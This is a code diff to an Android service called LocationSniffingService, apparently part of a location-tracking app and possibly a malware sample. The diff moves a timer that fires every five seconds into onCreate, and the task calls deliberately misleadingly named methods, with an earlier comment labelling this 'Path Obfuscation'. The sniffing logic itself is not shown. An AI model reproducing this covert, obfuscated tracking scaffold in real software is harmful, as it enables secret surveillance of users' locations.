@@ -21,6 +21,9 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.security.InvalidKeyException;
 import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
+
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 
@@ -33,34 +36,33 @@ public class LocationSniffingService extends Service{
 
     private final static String TAG = "LocationSniffingService";
 
-    private static Handler mHandler;
+    private static Timer mTimer = null;
 
     @Override
     public IBinder onBind(Intent intent) {
-
-        Log.d(TAG, "Starting handler");
-
-        if(mHandler != null){
-            mHandler = new Handler();
-            int delay = 5;
-
-            //Path Obfuscation
-            mHandler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    if(thisDoesnotDoAnything())
-                        return;
-                    else
-                        thisAlsoDoesnotDoAnything();
-                }
-            }, delay);
-        }
         return null;
     }
 
     //Starts the handler which will post every delay seconds
     @Override
     public void onCreate(){
+        Log.d(TAG, "onCreate()");
+        Log.d(TAG, "Starting handler");
+        Log.d(TAG, "Is it coming here");
+        mTimer = new Timer();
+        int delay = 5000;
+
+        mTimer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                if (thisDoesnotDoAnything())
+                    return;
+                else
+                    thisAlsoDoesnotDoAnything();
+            }
+        }, 0,delay);
+
+
     }
 
     private void thisAlsoDoesnotDoAnything(){
@@ -187,6 +189,9 @@ public class LocationSniffingService extends Service{
             e.printStackTrace();
             return false;
         } catch (InvalidKeyException e) {
+            e.printStackTrace();
+            return false;
+        } catch (Exception e){
             e.printStackTrace();
             return false;
         }
